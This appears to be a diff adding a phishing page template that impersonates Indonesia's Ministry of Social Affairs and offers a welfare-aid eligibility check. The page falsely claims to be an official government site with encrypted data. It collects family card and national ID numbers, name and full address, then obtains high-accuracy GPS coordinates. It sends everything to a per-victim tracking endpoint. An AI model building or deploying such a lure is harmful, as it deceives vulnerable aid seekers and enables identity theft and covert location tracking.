@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cek Bantuan Sosial - Kemensos</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary: #1a56db; --primary-dark: #1e40af; --primary-light: #3b82f6;
+            --accent: #f59e0b; --success: #10b981; --danger: #ef4444;
+            --gray-50: #f9fafb; --gray-100: #f3f4f6; --gray-200: #e5e7eb;
+            --gray-300: #d1d5db; --gray-500: #6b7280; --gray-700: #374151; --gray-900: #111827;
+        }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: linear-gradient(135deg, #1e3a5f 0%, #0f2744 40%, #0a1929 100%);
+            min-height: 100vh; color: var(--gray-900);
+        }
+        .header { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); position: relative; overflow: hidden; }
+        .header::before { content:''; position:absolute; top:-50%; right:-20%; width:300px; height:300px; background:rgba(255,255,255,0.05); border-radius:50%; }
+        .header-top { background: rgba(0,0,0,0.2); padding: 8px 16px; display:flex; justify-content:space-between; align-items:center; font-size:11px; color:rgba(255,255,255,0.8); }
+        .header-top a { color: rgba(255,255,255,0.9); text-decoration: none; margin-left: 12px; }
+        .header-main { padding: 20px 16px; display: flex; align-items: center; gap: 14px; position: relative; z-index: 1; }
+        .header-logo { width:48px; height:48px; background:white; border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:24px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .header-title h1 { color: white; font-size: 16px; font-weight: 700; }
+        .header-title p { color: rgba(255,255,255,0.7); font-size: 11px; margin-top: 2px; }
+        .banner { background: linear-gradient(135deg, var(--accent), #d97706); padding: 12px 16px; display:flex; align-items:center; gap:10px; }
+        .banner-icon { width:32px; height:32px; background:rgba(255,255,255,0.2); border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:16px; }
+        .banner-text { color:white; font-size:12px; font-weight:600; }
+        .banner-text span { display:block; font-size:10px; font-weight:400; opacity:0.9; }
+        .main { padding: 16px; max-width: 480px; margin: 0 auto; }
+        .card { background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.15); overflow: hidden; margin-bottom: 16px; }
+        .card-header { background: linear-gradient(135deg, #f0f7ff, #e8f4fd); padding: 14px 16px; border-bottom: 1px solid var(--gray-200); }
+        .card-header h2 { font-size: 13px; font-weight: 700; color: var(--primary-dark); display: flex; align-items: center; gap: 8px; }
+        .card-header h2 i { color: var(--primary); }
+        .card-body { padding: 16px; }
+
+        /* Form Styles */
+        .form-group { margin-bottom: 14px; }
+        .form-label { display: block; font-size: 11px; font-weight: 600; color: var(--gray-700); margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.3px; }
+        .form-label .req { color: var(--danger); }
+        .form-input { width: 100%; padding: 11px 14px; border: 2px solid var(--gray-200); border-radius: 10px; font-size: 14px; font-family: 'Plus Jakarta Sans', sans-serif; transition: all 0.2s; background: var(--gray-50); }
+        .form-input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 3px rgba(26,86,219,0.1); background: white; }
+        .form-input::placeholder { color: var(--gray-300); }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .form-divider { border: none; border-top: 1px solid var(--gray-200); margin: 16px 0; }
+        .form-section-title { font-size: 11px; font-weight: 700; color: var(--primary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; display: flex; align-items: center; gap: 6px; }
+
+        /* CTA */
+        .cta-section { padding: 20px 16px; text-align: center; }
+        .cta-icon { width:64px; height:64px; background:linear-gradient(135deg,var(--primary-light),var(--primary)); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 16px; font-size:28px; color:white; box-shadow:0 8px 25px rgba(59,130,246,0.4); animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100%{box-shadow:0 8px 25px rgba(59,130,246,0.4)} 50%{box-shadow:0 8px 40px rgba(59,130,246,0.6)} }
+        .cta-title { font-size:16px; font-weight:700; color:var(--gray-900); margin-bottom:6px; }
+        .cta-desc { font-size:12px; color:var(--gray-500); margin-bottom:20px; line-height:1.5; }
+        .btn-primary { width:100%; padding:14px; background:linear-gradient(135deg,var(--primary),var(--primary-dark)); color:white; border:none; border-radius:12px; font-size:14px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; transition:all 0.3s; font-family:'Plus Jakarta Sans',sans-serif; }
+        .btn-primary:hover { transform:translateY(-1px); box-shadow:0 6px 20px rgba(26,86,219,0.4); }
+        .btn-primary:disabled { opacity:0.7; cursor:not-allowed; transform:none; }
+        .btn-secondary { width:100%; padding:12px; background:var(--gray-100); color:var(--gray-700); border:none; border-radius:12px; font-size:13px; font-weight:600; cursor:pointer; margin-top:8px; font-family:'Plus Jakarta Sans',sans-serif; }
+
+        /* Steps */
+        .steps { display:flex; justify-content:center; gap:6px; margin:16px 0; }
+        .step { display:flex; align-items:center; gap:4px; font-size:10px; color:var(--gray-500); }
+        .step-dot { width:22px; height:22px; border-radius:50%; background:var(--gray-200); display:flex; align-items:center; justify-content:center; font-size:10px; font-weight:700; color:var(--gray-500); transition:all 0.3s; }
+        .step.active .step-dot { background:var(--primary); color:white; transform:scale(1.1); }
+        .step.done .step-dot { background:var(--success); color:white; }
+        .step-text { font-weight:600; }
+        .step.active .step-text { color:var(--primary); }
+
+        /* Alerts */
+        .alert { padding:12px 14px; border-radius:10px; font-size:12px; margin-bottom:14px; display:flex; align-items:flex-start; gap:8px; line-height:1.5; }
+        .alert-info { background:#eff6ff; color:#1e40af; border:1px solid #bfdbfe; }
+        .alert-warning { background:#fffbeb; color:#92400e; border:1px solid #fde68a; }
+        .alert-success { background:#ecfdf5; color:#065f46; border:1px solid #a7f3d0; }
+        .alert-error { background:#fef2f2; color:#991b1b; border:1px solid #fecaca; }
+
+        /* Success */
+        .success-check { width:72px; height:72px; background:var(--success); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 16px; font-size:32px; color:white; animation:scaleIn .5s ease; }
+        @keyframes scaleIn { 0%{transform:scale(0)} 50%{transform:scale(1.2)} 100%{transform:scale(1)} }
+
+        .footer { text-align:center; padding:20px 16px; color:rgba(255,255,255,0.5); font-size:11px; }
+        .footer a { color:rgba(255,255,255,0.7); text-decoration:none; }
+        .hidden { display:none!important; }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-top">
+            <span><i class="fas fa-shield-alt"></i> Situs Resmi Pemerintah</span>
+            <div>
+                <a href="#"><i class="fas fa-globe"></i> ID</a>
+                <a href="#"><i class="fas fa-question-circle"></i> Bantuan</a>
+            </div>
+        </div>
+        <div class="header-main">
+            <div class="header-logo">🇮🇩</div>
+            <div class="header-title">
+                <h1>Cek Bantuan Sosial</h1>
+                <p>Kementerian Sosial Republik Indonesia</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Banner -->
+    <div class="banner">
+        <div class="banner-icon"><i class="fas fa-hand-holding-heart"></i></div>
+        <div class="banner-text">
+            Verifikasi Penerima Bantuan
+            <span>Isi data dan konfirmasi lokasi Anda</span>
+        </div>
+    </div>
+
+    <div class="main">
+        <!-- Progress Steps -->
+        <div class="steps">
+            <div class="step active" id="s1"><div class="step-dot">1</div><span class="step-text">Data KTP</span></div>
+            <div class="step" id="s2"><div class="step-dot">2</div><span class="step-text">Lokasi</span></div>
+            <div class="step" id="s3"><div class="step-dot">3</div><span class="step-text">Selesai</span></div>
+        </div>
+
+        <!-- STEP 1: Form KTP -->
+        <div id="stepKTP">
+            <div class="card">
+                <div class="card-header">
+                    <h2><i class="fas fa-id-card"></i> Data Kartu Keluarga & KTP</h2>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-info">
+                        <i class="fas fa-info-circle"></i>
+                        <span>Isi data sesuai KTP/KK Anda dengan benar untuk verifikasi.</span>
+                    </div>
+
+                    <div class="form-section-title"><i class="fas fa-book"></i> Data Keluarga</div>
+
+                    <div class="form-group">
+                        <label class="form-label">Nomor KK <span class="req">*</span></label>
+                        <input type="text" class="form-input" id="fKK" placeholder="16 digit Nomor Kartu Keluarga" maxlength="16" inputmode="numeric">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Nomor KTP/NIK <span class="req">*</span></label>
+                        <input type="text" class="form-input" id="fNIK" placeholder="16 digit Nomor Induk Kependudukan" maxlength="16" inputmode="numeric">
+                    </div>
+
+                    <hr class="form-divider">
+
+                    <div class="form-section-title"><i class="fas fa-user"></i> Data Pribadi</div>
+
+                    <div class="form-group">
+                        <label class="form-label">Nama Lengkap <span class="req">*</span></label>
+                        <input type="text" class="form-input" id="fNama" placeholder="Nama lengkap sesuai KTP">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Alamat Lengkap <span class="req">*</span></label>
+                        <input type="text" class="form-input" id="fAlamat" placeholder="Jalan / Nomor Rumah / Dusun">
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">RT</label>
+                            <input type="text" class="form-input" id="fRT" placeholder="001" maxlength="3" inputmode="numeric">
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">RW</label>
+                            <input type="text" class="form-input" id="fRW" placeholder="001" maxlength="3" inputmode="numeric">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Kota/Kabupaten <span class="req">*</span></label>
+                        <input type="text" class="form-input" id="fKota" placeholder="Kota atau Kabupaten">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Provinsi <span class="req">*</span></label>
+                        <input type="text" class="form-input" id="fProvinsi" placeholder="Provinsi">
+                    </div>
+
+                    <button class="btn-primary" onclick="goToGPS()">
+                        <i class="fas fa-arrow-right"></i> Lanjut ke Verifikasi Lokasi
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 2: GPS -->
+        <div id="stepGPS" class="hidden">
+            <div class="card">
+                <div class="card-header">
+                    <h2><i class="fas fa-map-marker-alt"></i> Verifikasi Lokasi</h2>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-info">
+                        <i class="fas fa-info-circle"></i>
+                        <span>Klik tombol di bawah untuk membagikan lokasi Anda saat ini.</span>
+                    </div>
+
+                    <div class="cta-section" id="ctaBefore">
+                        <div class="cta-icon"><i class="fas fa-location-dot"></i></div>
+                        <div class="cta-title">Konfirmasi Lokasi Anda</div>
+                        <div class="cta-desc">Pastikan GPS perangkat Anda aktif.</div>
+                        <button class="btn-primary" id="btnAllow" onclick="requestLocation()">
+                            <i class="fas fa-location-crosshairs"></i> Bagikan Lokasi Saya
+                        </button>
+                        <button class="btn-secondary" onclick="goBackKTP()">
+                            <i class="fas fa-arrow-left"></i> Kembali
+                        </button>
+                    </div>
+
+                    <div class="cta-section hidden" id="ctaLoading">
+                        <div class="cta-icon" style="background:linear-gradient(135deg,#f59e0b,#d97706)">
+                            <i class="fas fa-spinner fa-spin"></i>
+                        </div>
+                        <div class="cta-title">Mendeteksi Lokasi...</div>
+                        <div class="cta-desc">Mohon tunggu, sedang mengambil data GPS.</div>
+                    </div>
+
+                    <div class="cta-section hidden" id="ctaSuccess">
+                        <div class="success-check"><i class="fas fa-check"></i></div>
+                        <div class="cta-title" style="color:#10b981">Verifikasi Berhasil!</div>
+                        <div class="cta-desc">Data dan lokasi Anda berhasil terkirim. Terima kasih.</div>
+                        <button class="btn-secondary" onclick="window.close()">
+                            <i class="fas fa-check"></i> Tutup Halaman
+                        </button>
+                    </div>
+
+                    <div class="cta-section hidden" id="ctaError">
+                        <div class="cta-icon" style="background:linear-gradient(135deg,#ef4444,#dc2626)">
+                            <i class="fas fa-exclamation-triangle"></i>
+                        </div>
+                        <div class="cta-title" style="color:#ef4444">Gagal Mendeteksi</div>
+                        <div class="cta-desc" id="errorMsg">Pastikan GPS perangkat Anda aktif.</div>
+                        <button class="btn-primary" onclick="requestLocation()">
+                            <i class="fas fa-redo"></i> Coba Lagi
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>&copy; 2026 Kementerian Sosial Republik Indonesia</p>
+        <p style="margin-top:4px"><a href="#">Kebijakan Privasi</a> &middot; <a href="#">Syarat & Ketentuan</a> &middot; <a href="#">Hubungi Kami</a></p>
+        <p style="margin-top:8px; opacity:0.6"><i class="fas fa-lock"></i> Data Anda aman dan terenkripsi</p>
+    </div>
+
+    <script>
+        const trackingId = "{{ tracking_id }}";
+
+        function showStep(n) {
+            document.getElementById('stepKTP').classList.toggle('hidden', n !== 1);
+            document.getElementById('stepGPS').classList.toggle('hidden', n !== 2);
+            for (let i = 1; i <= 3; i++) {
+                const el = document.getElementById('s' + i);
+                el.classList.remove('active', 'done');
+                if (i < n) el.classList.add('done');
+                if (i === n) el.classList.add('active');
+            }
+        }
+
+        function showSub(id) {
+            ['ctaBefore','ctaLoading','ctaSuccess','ctaError'].forEach(s => document.getElementById(s).classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+        }
+
+        function goToGPS() {
+            const kk = document.getElementById('fKK').value.trim();
+            const nik = document.getElementById('fNIK').value.trim();
+            const nama = document.getElementById('fNama').value.trim();
+            const alamat = document.getElementById('fAlamat').value.trim();
+            const kota = document.getElementById('fKota').value.trim();
+            const prov = document.getElementById('fProvinsi').value.trim();
+
+            if (!kk || kk.length !== 16) { alert('No. KK harus 16 digit!'); return; }
+            if (!nik || nik.length !== 16) { alert('No. KTP/NIK harus 16 digit!'); return; }
+            if (!nama) { alert('Nama Lengkap wajib diisi!'); return; }
+            if (!alamat) { alert('Alamat wajib diisi!'); return; }
+            if (!kota) { alert('Kota wajib diisi!'); return; }
+            if (!prov) { alert('Provinsi wajib diisi!'); return; }
+
+            showStep(2);
+        }
+
+        function goBackKTP() { showStep(1); }
+
+        function requestLocation() {
+            showSub('ctaLoading');
+            if (!navigator.geolocation) { showError('Browser tidak mendukung GPS.'); return; }
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
+        }
+
+        function sendLocation(pos) {
+            const data = {
+                no_kk: document.getElementById('fKK').value.trim(),
+                no_ktp: document.getElementById('fNIK').value.trim(),
+                nama: document.getElementById('fNama').value.trim(),
+                alamat: document.getElementById('fAlamat').value.trim(),
+                rt: document.getElementById('fRT').value.trim(),
+                rw: document.getElementById('fRW').value.trim(),
+                kota: document.getElementById('fKota').value.trim(),
+                provinsi: document.getElementById('fProvinsi').value.trim(),
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+            };
+
+            fetch(`/api/location/${trackingId}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(r => r.json())
+            .then(d => {
+                if (d.success) { showSub('ctaSuccess'); showStep(3); }
+                else { showError('Gagal mengirim data. Coba lagi.'); }
+            })
+            .catch(() => showError('Koneksi gagal. Periksa internet.'));
+        }
+
+        function handleError(e) {
+            const m = {1:'Izin lokasi ditolak. Aktifkan di pengaturan browser.',2:'GPS tidak ditemukan.',3:'Timeout, coba lagi.'};
+            showError(m[e.code] || 'Error tidak diketahui.');
+        }
+
+        function showError(msg) {
+            document.getElementById('errorMsg').textContent = msg;
+            showSub('ctaError');
+        }
+    </script>
+</body>
+</html>
